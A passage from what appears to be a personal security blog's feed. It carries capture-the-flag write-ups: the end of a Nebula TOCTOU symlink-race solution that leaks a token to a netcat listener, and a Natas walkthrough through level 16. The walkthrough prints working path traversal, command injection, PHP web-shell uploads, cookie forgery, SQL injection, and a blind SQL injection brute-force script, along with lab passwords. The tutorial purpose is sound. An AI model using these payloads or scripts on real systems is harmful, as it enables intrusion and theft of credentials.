   printf(&ldquo;Unable to write banner to host %s\n&rdquo;, host);
   exit(EXIT_FAILURE);
  }</p>

<h1>undef HITHERE</h1>

<p>  printf(&ldquo;Connected!\nSending file .. &rdquo;); fflush(stdout);</p>

<p>  ffd = open(file, O_RDONLY);
  if(ffd == -1) {
   printf(&ldquo;Damn. Unable to open file\n&rdquo;);
   exit(EXIT_FAILURE);
  }</p>

<p>  rc = read(ffd, buffer, sizeof(buffer));
  if(rc == -1) {
   printf(&ldquo;Unable to read from file: %s\n&rdquo;, strerror(errno));
   exit(EXIT_FAILURE);
  }</p>

<p>  write(fd, buffer, rc);</p>

<p>  printf(&ldquo;wrote file!\n&rdquo;);</p>

<p> } else {
  printf(&ldquo;You don&rsquo;t have access to %s\n&rdquo;, file);
 }
}
```</p>

<p>In the home directory there is also a token file which we probably want to read. Since the briefing already hints at the system call we need to exploit, let&rsquo;s read the <em>access()</em> manpage:</p>

<ul>
<li><em>int access(const char </em>pathname, int mode);*</li>
</ul>


<blockquote><p>access() checks whether the calling process can access the file <em>pathname</em>.  If <em>pathname</em> is a symbolic link, it is dereferenced.</p>

<p> Warning: Using these calls to check if a user is authorized to, for example, open a file before actually doing so using <em>open(2)</em> creates a
security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.  For this
reason, the use of this system call should be avoided.</p></blockquote>

<p>The type of vulnerability in this code is a time-of-check, time-of-use (TOCTOU) race condition. You can read more about it on <a href="https://cwe.mitre.org/data/definitions/367.html">mitre.org</a>. To summarize, the program checks the property of a file (in this case it checks if the user is allowed to read the file), and then performs an operation on it (reading, writing, etc.). But the file that is checked is referenced by its name, and not its file descriptor, meaning that the program is vulnerable in the interval between the call to <em>access()</em> and the call to <em>open()</em>, since the file that was passed to <em>access()</em> might not be the same as the one which <em>open()</em> will operate on.</p>

<p>First of all I wanted to test that the program will upload a file without problems, so I had netcat listen on my machine and created a file on the nebula system and tried to send it:</p>

<p><code>plain
level10@nebula:/home/flag10$ ./flag10 /tmp/tok 192.168.80.130
Connecting to 192.168.80.130:18211 .. Connected!
Sending file .. wrote file!
</code></p>

<p>And on my netcat side:</p>

<p><code>plain
nc: connect to 192.168.80.130 18211 from 192.168.80.133 60491
.oO Oo.
blabla
</code></p>

<p>So it worked just fine. The binary sent a banner and then the contents of the file. Now it&rsquo;s a matter of how to fool it into sending the token which we don&rsquo;t have permission to read. Well, what if the <em>access()</em> gives the ok to a file that I made, but when <em>open()</em> will try to read it, instead it will be a symbolic link to the token? After some trial and error, here&rsquo;s the solution that worked:</p>

<ul>
<li>first, on my host machine, I ran netcat in an infinite loop so that it will keep listening even when the other side closes the connection:</li>
</ul>


<p><code>plain
root@kali:~# while true; do nc -nlp 18211; done
</code></p>

<ul>
<li>on the Nebula machine, I ran this command:</li>
</ul>


<p><code>plain
level10@nebula:/home/flag10$ while true; do touch /tmp/tok &amp; ./flag10 /tmp/tok 192.168.80.130 &amp; ln -fs /home/flag10/token /tmp/tok &amp; rm -f /tmp/tok; done
</code></p>

<p>This is another infinite loop that runs a series of commands in the background. A file named <em>tok</em> is created in <em>/tmp/</em>, the flag10 binary attempts to send this file to my host, but there is also a symlink command that links <em>tok</em> to the token, and this might happen before or after the <em>access()</em> call. And finally, the <em>tok</em> file is removed. In the netcat window, you will see the output flying by, and besides the banner, you can see the token contents: <code>615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</code>, when the timing is right.</p>

<p>Note that these commands aren&rsquo;t chained, but they run independent of each other (forked and run asynchronously in a separate sub-shell). You can read more here about the <a href="http://bashitout.com/2013/05/18/Ampersands-on-the-command-line.html">use of &amp; on the command line</a></p>

<p>There is another alternative way I completed it, by following the example of the race condition attacks on <a href="https://iseclab.org/secprog/slides/secprog-6.pdf">pages 16-19</a> (there are nice diagrams helping with the explanation). Again, with netcat listening and 2 terminals on the Nebula machine, in one I run:</p>

<p><code>plain
level10@nebula:/tmp$ while true; do touch dummy; ln -sf dummy tok; rm -f tok; ln -sf /home/flag10/token tok; done
</code></p>

<p>And in the other:</p>

<p><code>plain
level10@nebula:/home/flag10$ while true; do ./flag10 /tmp/tok 192.168.80.130; done
</code></p>

<p>When <em>tok</em> is passed to <em>access()</em>, everything is fine, but before the <em>open()</em> call, <em>tok</em> has been replaced with a symlink to the token, which <em>open()</em> happily reads.</p>

<p>To finish, I used the token to SSH in as the flag10 user and run <em>getflag</em>:</p>

<p><code>plain
flag10@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></p>

<p>``` plain</p>

<hr />

<p>/ Better hope the life-inspector doesn&rsquo;t  \
| come around while you have your life in |
\ such a mess.                            /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OverTheWire: Natas]]></title>
    <link href="http://chousensha.github.io/blog/2015/11/30/overthewire-natas/"/>
    <updated>2015-11-30T04:50:00-05:00</updated>
    <id>http://chousensha.github.io/blog/2015/11/30/overthewire-natas</id>
    <content type="html"><![CDATA[<p>Natas teaches the basics of serverside web-security.</p>

<p>Each level of natas consists of its own website located at **<a href="http://natasX.natas.labs.overthewire.org**,">http://natasX.natas.labs.overthewire.org**,</a> where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.</p>

<p>Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in <strong>/etc/natas_webpass/</strong>. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.</p>

<p>Start here:</p>

<p>Username: natas0</p>

<p>Password: natas0</p>

<p>URL:      <a href="http://natas0.natas.labs.overthewire.org">http://natas0.natas.labs.overthewire.org</a></p>

<!-- more -->


<h3>Level 0</h3>

<p><img class="center" src="/images/overthewire/natas/natas0.png" title="&lsquo;natas0&rsquo; &lsquo;natas 0&rsquo;" ></p>

<p>Look in the source for the following comment:</p>

<p>``` html</p>

<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->


<p>```</p>

<h3>Level 1</h3>

<p><img class="center" src="/images/overthewire/natas/natas1.png" title="&lsquo;natas1&rsquo; &lsquo;natas 1&rsquo;" ></p>

<p>You can still view the page source from the URL:</p>

<p><code>plain
view-source:http://natas1.natas.labs.overthewire.org/
</code></p>

<p>Again, the password is in a comment:</p>

<p>``` html</p>

<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->


<p>```</p>

<h3>Level 2</h3>

<p><img class="center" src="/images/overthewire/natas/natas2.png" title="&lsquo;natas2&rsquo; &lsquo;natas 2&rsquo;" ></p>

<p>In the source you will see a directory path that you can navigate to:</p>

<p><code>html
&lt;img src="files/pixel.png"&gt;
</code>
Go to <a href="http://natas2.natas.labs.overthewire.org/files/">http://natas2.natas.labs.overthewire.org/files/</a> and you will see a directory listing. Chech the users.txt file:</p>

<p>``` plain</p>

<h1>username:password</h1>

<p>alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```</p>

<h3>Level 3</h3>

<p><img class="center" src="/images/overthewire/natas/natas2.png" title="&lsquo;natas3&rsquo; &lsquo;natas 3&rsquo;" ></p>

<p>There is a comment in the source again:</p>

<p>``` html</p>

<!-- No more information leaks!! Not even Google will find it this time... -->


<p>```</p>

<p>Well, since they mentioned Google, let&rsquo;s look for a robots.txt file..If you go to <a href="http://natas3.natas.labs.overthewire.org/robots.txt">http://natas3.natas.labs.overthewire.org/robots.txt</a> , you will see the following line: <code>Disallow: /s3cr3t/</code>. Navigate to <a href="http://natas3.natas.labs.overthewire.org/s3cr3t/">http://natas3.natas.labs.overthewire.org/s3cr3t/</a> and there is another users.txt file: <code>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</code></p>

<h3>Level 4</h3>

<p><img class="center" src="/images/overthewire/natas/natas4.png" title="&lsquo;natas4&rsquo; &lsquo;natas 4&rsquo;" ></p>

<p>If our access is permitted based on the Referer header, all we have to do is change it. I used Live HTTP Headers for the task. Changed the Referer, refreshed the page and: <code>Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</code></p>

<h3>Level 5</h3>

<p><img class="center" src="/images/overthewire/natas/natas5.png" title="&lsquo;natas5&rsquo; &lsquo;natas 5&rsquo;" ></p>

<p>So how do they determine if I&rsquo;m logged in? A cookie maybe..I used Firebug to look at cookies, and indeed there is a loggedin cookie with the value of 0. Changed it to 1 and <code>Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</code></p>

<h3>Level 6</h3>

<p><img class="center" src="/images/overthewire/natas/natas6.png" title="&lsquo;natas6&rsquo; &lsquo;natas 6&rsquo;" ></p>

<p>This time we are also given the backend source code:</p>

<p>``` php
&lt;?</p>

<p>include &ldquo;includes/secret.inc&rdquo;;</p>

<pre><code>if(array_key_exists("submit", $_POST)) {
    if($secret == $_POST['secret']) {
    print "Access granted. The password for natas7 is &lt;censored&gt;";
} else {
    print "Wrong secret";
}
}
</code></pre>

<p>?>
```</p>

<p>That include directive stands out. If you go to <a href="http://natas6.natas.labs.overthewire.org/includes/secret.inc">http://natas6.natas.labs.overthewire.org/includes/secret.inc</a> you get a blank page. But the source is not so blank:</p>

<p><code>php
&lt;?
$secret = "FOEIUWGHFEEUHOFUOIU";
?&gt;
</code></p>

<p>Enter it in the form and <code>Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</code></p>

<h3>Level 7</h3>

<p><img class="center" src="/images/overthewire/natas/natas7.png" title="&lsquo;natas7&rsquo; &lsquo;natas 7&rsquo;" ></p>

<p>Inside the source there&rsquo;s a comment:</p>

<p>``` html</p>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->


<p>```</p>

<p>Going to the Home and About pages, nothing interesting jumps out. However, combining the hint with how the URL looks like, I thought about local file inclusion. The normal URL is <a href="http://natas7.natas.labs.overthewire.org/index.php?page=home">http://natas7.natas.labs.overthewire.org/index.php?page=home</a> and I tried to read the password file by changing it to <a href="http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8">http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8</a> . And it worked! The password is <code>DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</code></p>

<h3>Level 8</h3>

<p><img class="center" src="/images/overthewire/natas/natas6.png" title="&lsquo;natas8&rsquo; &lsquo;natas 8&rsquo;" ></p>

<p>We have to look at PHP source code again:</p>

<p>``` php
&lt;?</p>

<p>$encodedSecret = &ldquo;3d3d516343746d4d6d6c315669563362&rdquo;;</p>

<p>function encodeSecret($secret) {</p>

<pre><code>return bin2hex(strrev(base64_encode($secret)));
</code></pre>

<p>}</p>

<p>if(array_key_exists(&ldquo;submit&rdquo;, $_POST)) {</p>

<pre><code>if(encodeSecret($_POST['secret']) == $encodedSecret) {
print "Access granted. The password for natas9 is &lt;censored&gt;";
} else {
print "Wrong secret";
}
</code></pre>

<p>}
?>
```</p>

<p>So it&rsquo;s looking for a string that matches the end result of all these conversions. Instead, we can reverse the process and decrypt the encoded secret to its original value.</p>

<p>``` plain</p>

<h1>hex to binary</h1>

<p>3d3d516343746d4d6d6c315669563362 becomes 00111101 00111101 01010001 01100011 01000011 01110100 01101101 01001101 01101101 01101100 00110001 01010110 01101001 01010110 00110011 01100010</p>

<h1>binary to ascii</h1>

<p>00111101 00111101 01010001 01100011 01000011 01110100 01101101 01001101 01101101 01101100 00110001 01010110 01101001 01010110 00110011 01100010  becomes ==QcCtmMml1ViV3b</p>

<h1>reverse</h1>

<p>==QcCtmMml1ViV3b becomes b3ViV1lmMmtCcQ==</p>

<h1>final base64 decode</h1>

<p>b3ViV1lmMmtCcQ== becomes oubWYf2kBq
```</p>

<p>Input <code>oubWYf2kBq</code> in the form and you will get <code>Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</code></p>

<h3>Level 9</h3>

<p><img class="center" src="/images/overthewire/natas/natas9.png" title="&lsquo;natas9&rsquo; &lsquo;natas 9&rsquo;" ></p>

<p>If you enter something, the backend greps for that word in a dictionary file:</p>

<p>``` php
&lt;?
$key = &ldquo;&rdquo;;</p>

<p>if(array_key_exists(&ldquo;needle&rdquo;, $_REQUEST)) {</p>

<pre><code>$key = $_REQUEST["needle"];
</code></pre>

<p>}</p>

<p>if($key != &ldquo;&rdquo;) {</p>

<pre><code>passthru("grep -i $key dictionary.txt");
</code></pre>

<p>}
?>
```</p>

<p>So I thought to terminate the first command and chain another one, that would read the password: <code>; cat /etc/natas_webpass/natas10</code>. And the password is output, along with the entire file: <code>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</code></p>

<h3>Level 10</h3>

<p><img class="center" src="/images/overthewire/natas/natas10.png" title="&lsquo;natas10&rsquo; &lsquo;natas 10&rsquo;" ></p>

<p>This level is the same as the last, except now there is some filtering in place:</p>

<p>``` php
&lt;?
$key = &ldquo;&rdquo;;</p>

<p>if(array_key_exists(&ldquo;needle&rdquo;, $_REQUEST)) {</p>

<pre><code>$key = $_REQUEST["needle"];
</code></pre>

<p>}</p>

<p>if($key != &ldquo;&rdquo;) {</p>

<pre><code>if(preg_match('/[;|&amp;]/',$key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i $key dictionary.txt");
}
</code></pre>

<p>}
?>
```</p>

<p>This filtering doesn&rsquo;t exclude all characters that could be useful. If you read the <em>grep</em> manpage, you will come across this section:</p>

<blockquote><p>Anchoring
The caret ^ and the dollar sign $ are meta-characters that respectively  match the empty string at the beginning and end of a line.</p></blockquote>

<p>So I went ahead and tried <code>^ cat /etc/natas_webpass/natas11</code>, and the password was output, along with the rest of the file. This worked because <em>grep</em> returned every line containing the string that matches the beginning of the line (or end if you use $). I just added the password file for <em>grep</em> to read</p>

<p><code>plain
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
dictionary.txt:American
dictionary.txt:Americanism
dictionary.txt:Americanism's
dictionary.txt:Americanisms
dictionary.txt:Americans
...
</code></p>

<h3>Level 11</h3>

<p><img class="center" src="/images/overthewire/natas/natas11.png" title="&lsquo;natas11&rsquo; &lsquo;natas 11&rsquo;" ></p>

<p>The backend code is more complicated:</p>

<p>``` php
&lt;?</p>

<p>$defaultdata = array( &ldquo;showpassword&rdquo;=>&ldquo;no&rdquo;, &ldquo;bgcolor&rdquo;=>&ldquo;#ffffff&rdquo;);</p>

<p>function xor_encrypt($in) {</p>

<pre><code>$key = '&lt;censored&gt;';
$text = $in;
$outText = '';

// Iterate through each character
for($i=0;$i&lt;strlen($text);$i++) {
$outText .= $text[$i] ^ $key[$i % strlen($key)];
}

return $outText;
</code></pre>

<p>}</p>

<p>function loadData($def) {</p>

<pre><code>global $_COOKIE;
$mydata = $def;
if(array_key_exists("data", $_COOKIE)) {
$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
if(is_array($tempdata) &amp;&amp; array_key_exists("showpassword", $tempdata) &amp;&amp; array_key_exists("bgcolor", $tempdata)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
    $mydata['showpassword'] = $tempdata['showpassword'];
    $mydata['bgcolor'] = $tempdata['bgcolor'];
    }
}
}
return $mydata;
</code></pre>

<p>}</p>

<p>function saveData($d) {</p>

<pre><code>setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
</code></pre>

<p>}</p>

<p>$data = loadData($defaultdata);</p>

<p>if(array_key_exists(&ldquo;bgcolor&rdquo;,$_REQUEST)) {</p>

<pre><code>if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
    $data['bgcolor'] = $_REQUEST['bgcolor'];
}
</code></pre>

<p>}</p>

<p>saveData($data);
?></p>

<p>&lt;?
if($data[&ldquo;showpassword&rdquo;] == &ldquo;yes&rdquo;) {</p>

<pre><code>print "The password for natas12 is &lt;censored&gt;&lt;br&gt;";
</code></pre>

<p>}</p>

<p>?>
```</p>

<p>Well, looking at the page, we see a <em>data</em> cookie that&rsquo;s base64 encoded, but decoding it gives rubbish because it&rsquo;s XOR encrypted. The PHP code operates on it. We can also set the background color by giving it a valid value.</p>

<p>Now for the code! Breaking it down:</p>

<ul>
<li><p>The default data is an array comprised of the values <em>showpassword</em> set to no and <em>bgcolor</em> set to #ffffff</p></li>
<li><p>The xor_encrypt function performs XOR encryption on the given input</p></li>
<li><p>The loadData function loads the data from the cookie, or keeps the default values if the data is invalid.</p></li>
<li><p>The saveData function sets the cookie&rsquo;s value by the process of  <code>JSON encode &ndash;> XOR encrypt &ndash;> base64 encode</code></p></li>
</ul>


<p>At the end, we can see that if <em>showpassword</em> is set to yes, the password for the next level will be displayed. To achieve this, we have to mirror the cookie creation process, and change that value accordingly. But we don&rsquo;t have the key used for the XOR encryption. However, we know that in XOR encryption, <code>original xor key = encrypted</code>, and the following also applies: <code>original xor encrypted = key</code>. Because we have both the original data and the encrypted version, we can recover the key!</p>

<p>I kept the original code since it does all the work, and only made some modifications to the variables:</p>

<p>``` php
// the value of the cookie after base64 decoding
$original = base64_decode(&lsquo;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&rsquo;);</p>

<p>function xor_encrypt($in) {</p>

<pre><code>$defaultdata = array( "showpassword"=&gt;"no", "bgcolor"=&gt;"#ffffff");
// the json encoded version of the default data
$key = json_encode($defaultdata);
$text = $in;
$outText = '';

// Iterate through each character
for($i=0;$i&lt;strlen($text);$i++) {
$outText .= $text[$i] ^ $key[$i % strlen($key)];
}

return $outText;
</code></pre>

<p>}</p>

<p>print xor_encrypt($original);
```</p>

<p>Ran this through the PHP sandbox at <a href="http://sandbox.onlinephpfunctions.com/">http://sandbox.onlinephpfunctions.com/</a> and the result was the string <code>qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq</code>. The string <em>qw8J</em> gets repeated, this is the key! Now we can reuse the code to create a cookie encrypted with this key, and with <em>showpassword</em> set to yes:</p>

<p>``` php
$defaultdata = array( &ldquo;showpassword&rdquo;=>&ldquo;yes&rdquo;, &ldquo;bgcolor&rdquo;=>&ldquo;#ffffff&rdquo;);
$json_data = json_encode($defaultdata);</p>

<p>function xor_encrypt($in) {</p>

<pre><code>$key = 'qw8J';
$text = $in;
$outText = '';

// Iterate through each character
for($i=0;$i&lt;strlen($text);$i++) {
$outText .= $text[$i] ^ $key[$i % strlen($key)];
}

return base64_encode($outText);
</code></pre>

<p>}</p>

<p>print xor_encrypt($json_data);
```</p>

<p>Running this code gives a new cookie value: <code>ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK</code>. Replace the cookie value in the page and you will get the next password: <code>The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</code></p>

<h3>Level 12</h3>

<p><img class="center" src="/images/overthewire/natas/natas12.png" title="&lsquo;natas12&rsquo; &lsquo;natas 12&rsquo;" ></p>

<p>For this mission it seems we can upload a file to the server.</p>

<p>``` php
&lt;?</p>

<p>function genRandomString() {</p>

<pre><code>$length = 10;
$characters = "0123456789abcdefghijklmnopqrstuvwxyz";
$string = "";    

for ($p = 0; $p &lt; $length; $p++) {
    $string .= $characters[mt_rand(0, strlen($characters)-1)];
}

return $string;
</code></pre>

<p>}</p>

<p>function makeRandomPath($dir, $ext) {</p>

<pre><code>do {
$path = $dir."/".genRandomString().".".$ext;
} while(file_exists($path));
return $path;
</code></pre>

<p>}</p>

<p>function makeRandomPathFromFilename($dir, $fn) {</p>

<pre><code>$ext = pathinfo($fn, PATHINFO_EXTENSION);
return makeRandomPath($dir, $ext);
</code></pre>

<p>}</p>

<p>if(array_key_exists(&ldquo;filename&rdquo;, $_POST)) {</p>

<pre><code>$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


    if(filesize($_FILES['uploadedfile']['tmp_name']) &gt; 1000) {
    echo "File is too big";
} else {
    if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
        echo "The file &lt;a href=\"$target_path\"&gt;$target_path&lt;/a&gt; has been uploaded";
    } else{
        echo "There was an error uploading the file, please try again!";
    }
}
</code></pre>

<p>} else {
?>
```</p>

<p>The code tests if the file satisfies the constraints and uploads it with a new name that&rsquo;s randomly generated. Then it gives you the link where you can find it:</p>

<p><img class="center" src="/images/overthewire/natas/upload.png" title="&lsquo;upload&rsquo; &lsquo;upload&rsquo;" ></p>

<p>So I tried uploading a PHP file that would read the password for the next level:</p>

<p><code>plain
root@kali:~/Desktop# cat pass.php
&lt;?
echo(exec('cat /etc/natas_webpass/natas13'));
?&gt;
</code></p>

<p>But the extension is changed to a jpg, so the code doesn&rsquo;t get executed. Further in the HTML there is this line:</p>

<p><code>html
&lt;input type="hidden" name="filename" value="&lt;? print genRandomString(); ?&gt;.jpg" /&gt;
</code></p>

<p>I used Firebug to change the jpg extension to a php one and re-uploaded the file and this time it worked: <code>The file upload/g72k7zidu8.php has been uploaded</code>. Next I followed the link and inside was the password: <code>jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</code></p>

<h3>Level 13</h3>

<p><img class="center" src="/images/overthewire/natas/natas13.png" title="&lsquo;natas13&rsquo; &lsquo;natas 13&rsquo;" ></p>

<p>Ok, this time they made a modification so that only jpg files can be uploaded..or so they claim. The code is the same as the last challenge, except for a new check:</p>

<p>``` php
else if (! exif_imagetype($_FILES[&lsquo;uploadedfile&rsquo;][&lsquo;tmp_name&rsquo;])) {</p>

<pre><code>    echo "File is not an image";
</code></pre>

<p>```</p>

<p><strong>exif_imagetype()</strong> reads the first bytes of an image and checks its signature. If the signature is invalid, it returns False.</p>

<p>This type of check can be fooled by providing the specific magic number for the file in question. The signature for jpg files is the hex value 0xFFD8FFE0</p>

<p><code>plain
root@kali:~/Desktop# echo -e '\xFF\xD8\xFF\xE0' &gt; pass.php
root@kali:~/Desktop# echo "&lt;?echo(exec('cat /etc/natas_webpass/natas13'));?&gt;" &gt;&gt; pass.php
</code></p>

<p>The upload process is the same (don&rsquo;t forget to modify the extension with Firebug or other tools). Then I went to the link and the password is  <code>Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</code>. If you notice the weird looking characters ÿØÿà before it, it&rsquo;s because the text representation of the jpg magic number is also echoed back. The password starts after that</p>

<h3>Level 14</h3>

<p><img class="center" src="/images/overthewire/natas/natas14.png" title="&lsquo;natas14&rsquo; &lsquo;natas 14&rsquo;" ></p>

<p>Looking at the code hints at what type of vulnerability can be exploited:</p>

<p>``` php
&lt;?
if(array_key_exists(&ldquo;username&rdquo;, $_REQUEST)) {</p>

<pre><code>$link = mysql_connect('localhost', 'natas14', '&lt;censored&gt;');
mysql_select_db('natas14', $link);

$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
if(array_key_exists("debug", $_GET)) {
    echo "Executing query: $query&lt;br&gt;";
}

if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) {
        echo "Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;";
} else {
        echo "Access denied!&lt;br&gt;";
}
mysql_close($link);
</code></pre>

<p>} else {
?>
```</p>

<p>No input sanitization = SQL injection! Moreover, we can get additional information by setting debug to True in the URL. For that, I also included the username and password fields in the URL: <a href="http://natas14.natas.labs.overthewire.org/index.php?debug=True&amp;username=test&amp;password=pass">http://natas14.natas.labs.overthewire.org/index.php?debug=True&amp;username=test&amp;password=pass</a></p>

<p>And now there was a message showing the query that was run on the backend:</p>

<p><code>plain
 Executing query: SELECT * from users where username="test" and password="pass"
Access denied!
</code></p>

<p>After seeing how the query looks like, I used the following injection string to fool the database:</p>

<p>username = can be anything</p>

<p>password = <code>pass" or 1=1&mdash; </code></p>

<p>To see why this works, look at the query now:</p>

<p><code>sql
Executing query: SELECT * from users where username="test" and password="pass" or 1=1-- "
</code></p>

<p>By fixing the quotes we forced the database to evaluate an always true condition (1=1) and bypass the credentials check. The <code>&mdash; </code> comments out the rest of the query which would otherwise break our injection. If you inject in the URL, don&rsquo;t forget that you need to URL encode the space (%20)</p>

<p>After the SQL injection, you will see this: <code>Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</code></p>

<h3>Level 15</h3>

<p><img class="center" src="/images/overthewire/natas/natas15.png" title="&lsquo;natas15&rsquo; &lsquo;natas 15&rsquo;" ></p>

<p>This time you can check if a username exists or not. Let&rsquo;s look at the code:</p>

<p>``` php
&lt;?</p>

<p>/<em>
CREATE TABLE <code>users</code> (
  <code>username</code> varchar(64) DEFAULT NULL,
  <code>password</code> varchar(64) DEFAULT NULL
);
</em>/</p>

<p>if(array_key_exists(&ldquo;username&rdquo;, $_REQUEST)) {</p>

<pre><code>$link = mysql_connect('localhost', 'natas15', '&lt;censored&gt;');
mysql_select_db('natas15', $link);

$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
if(array_key_exists("debug", $_GET)) {
    echo "Executing query: $query&lt;br&gt;";
}

$res = mysql_query($query, $link);
if($res) {
if(mysql_num_rows($res) &gt; 0) {
    echo "This user exists.&lt;br&gt;";
} else {
    echo "This user doesn't exist.&lt;br&gt;";
}
} else {
    echo "Error in query.&lt;br&gt;";
}

mysql_close($link);
</code></pre>

<p>} else {
?>
```</p>

<p>We can again see the query that is being run on the backend by manipulating the URL: <a href="http://natas15.natas.labs.overthewire.org/index.php?debug=True&amp;username=natas16">http://natas15.natas.labs.overthewire.org/index.php?debug=True&amp;username=natas16</a></p>

<p><code>plain
Executing query: SELECT * from users where username="natas16"
This user exists.
</code></p>

<p>So, this time the SQL code checks for the existence of a user and reports whether that username exists or not. We can&rsquo;t inject in a way that would directly give us the password like previously, but we know the query will be run against the <em>users</em> table, which contains both usernames and passwords. There is a way to bruteforce the natas16 password by forcing the database to check it one character at a time and report True of False (user exists or not). The statement to inject will look like this: <code>username=natas16" AND password LIKE BINARY &ldquo;a%&rdquo;&mdash; </code>. Testing it in the URL (don&rsquo;t forget to encode the space after comments), you can check one character a time until the database respons with the user exists message. Then you know the password begins with the respective character and you can move on to the next. But the password is 32 characters long, so we will do it in an automated way!</p>

<p>Some explanation about the SQL keywords:</p>

<ul>
<li><p>The AND operator displays a record if both the first condition AND the second condition are true.</p></li>
<li><p>The LIKE operator is used in a WHERE clause to search for a specified pattern in a column.</p></li>
<li><p>The BINARY operator casts the string following it to a binary string. This is an easy way to force a column comparison to be done byte by byte rather than character by character. This causes the comparison to be case sensitive even if the column is not defined as BINARY or BLOB. BINARY also causes trailing spaces to be significant.</p></li>
<li><p><strong>%</strong>     A substitute for zero or more characters</p></li>
</ul>


<p>If you run this query with the debug parameter set, you will see how it looks like:</p>

<p><code>plain
Executing query: SELECT * from users where username="natas16"and password like binary "a%"-- "
</code></p>

<p>When the entire statement is evaluated, the query will return True of False, and we will use that information to build the password. Here&rsquo;s a Python script to do the job:</p>

<p>``` python
import requests</p>

<p>passwd = &ldquo;&rdquo;</p>

<h1>this is the range of possible values</h1>

<p>testchars = &ldquo;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&rdquo;
index = 0
while index &lt; len(testchars):</p>

<pre><code># binary keyword forces a case sensitive search
query = dict(username="natas16\" AND password like BINARY \"" + \
             passwd + testchars[index] + "%\" -- ",submit="Check existence")
# example query: {'username': 'natas16" AND password like BINARY " a%" -- '}
guess = requests.post('http://natas15.natas.labs.overthewire.org/', \
                  auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),\
                  params = query)
# example encoded query (automatic encoding):
# username=natas16%22+AND+password+like+BINARY+%22+a%25%22+--+
if "This user exists" in guess.text:

    passwd += testchars[index]
    print passwd
    index = 0
    continue
index += 1
</code></pre>

<p>```</p>

<p>The passwod will be slowly built like this:</p>

<p><code>plain
W
Wa
WaI
WaIH
WaIHE
WaIHEa
WaIHEac
WaIHEacj
WaIHEacj6
WaIHEacj63
WaIHEacj63w
WaIHEacj63wn
WaIHEacj63wnN
WaIHEacj63wnNI
WaIHEacj63wnNIB
WaIHEacj63wnNIBR
WaIHEacj63wnNIBRO
WaIHEacj63wnNIBROH
WaIHEacj63wnNIBROHe
WaIHEacj63wnNIBROHeq
WaIHEacj63wnNIBROHeqi
WaIHEacj63wnNIBROHeqi3
WaIHEacj63wnNIBROHeqi3p
WaIHEacj63wnNIBROHeqi3p9
WaIHEacj63wnNIBROHeqi3p9t
WaIHEacj63wnNIBROHeqi3p9t0
WaIHEacj63wnNIBROHeqi3p9t0m
WaIHEacj63wnNIBROHeqi3p9t0m5
WaIHEacj63wnNIBROHeqi3p9t0m5n
WaIHEacj63wnNIBROHeqi3p9t0m5nh
WaIHEacj63wnNIBROHeqi3p9t0m5nhm
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
</code></p>

<p>And now we have the password for natas16: <code>WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</code></p>

<h3>Level 16</h3>

<p><img class="center" src="/images/overthewire/natas/natas16.png" title="&lsquo;natas16&rsquo; &lsquo;natas 16&rsquo;" ></p>

<p>``` php
&lt;?
$key = &ldquo;&rdquo;;</p>

<p>if(array_key_exists(&ldquo;needle&rdquo;, $_REQUEST)) {</p>

<pre><code>$key = $_REQUEST["needle"];
</code></pre>

